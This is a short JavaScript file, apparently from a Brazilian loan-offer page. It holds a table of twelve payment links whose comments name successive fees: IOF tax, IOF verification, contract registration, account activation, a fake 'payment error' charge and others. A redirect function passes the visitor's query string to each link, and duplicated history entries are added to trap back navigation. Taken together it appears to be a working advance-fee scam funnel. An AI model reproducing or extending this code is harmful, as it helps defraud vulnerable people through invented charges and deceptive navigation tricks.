const baseLinks = {
    up1: "https://pay.pagsitebr.online/69797c68c39ed90210aacf5e", // IOF
    up2: "https://pay.pagsitebr.online/69797c9ac39ed90210aacfc6", // Taxa de verificação de IOF
    up3: "https://pay.pagsitebr.online/69797cc2dee32d60f8676761", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.pagsitebr.online/69797ce30ede7a83924993d7", // NFe
    up5: "https://pay.pagsitebr.online/69797d04c39ed90210aad0f4", // Ativar conta
    up6: "https://pay.pagsitebr.online/69797d1fdee32d60f8676852", // Taxa de registro do contrato
    up7: "https://pay.pagsitebr.online/69797d36c39ed90210aad14f", // Parabéns, 20k adicional
    up8: "https://pay.pagsitebr.online/69797d4d0ede7a839249945e", // Erro no pagamento - 14,06
    up9: "https://pay.pagsitebr.online/69797d670ede7a8392499483", // APP - 11,99
    up10:"https://pay.pagsitebr.online/69797d82c39ed90210aad1a8", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.pagsitebr.online/69797d9c0ede7a8392499510", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.pagsitebr.online/69797db4c39ed90210aad203" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);



